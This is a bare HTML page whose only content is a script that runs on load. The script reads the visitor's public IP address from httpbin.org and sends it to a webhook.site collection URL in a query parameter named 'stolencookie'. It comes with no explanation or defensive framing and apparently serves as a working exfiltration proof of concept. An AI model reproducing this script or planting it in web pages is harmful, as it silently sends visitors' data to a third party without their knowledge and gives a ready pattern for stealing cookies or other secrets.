<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
        fetch("https://httpbin.org/ip")
    .then(response => response.text())
    .then(data => {
        fetch("https://webhook.site/90214831-76aa-470f-b3df-72afa88c370b/?stolencookie=" + encodeURIComponent(data))
            .then(innerResponse => innerResponse.text())
            .then(innerData => console.log(innerData))
            .catch(innerError => console.error('Inner Error:', innerError));
    })
    .catch(error => console.error('Error:', error));

    </script>
</body>
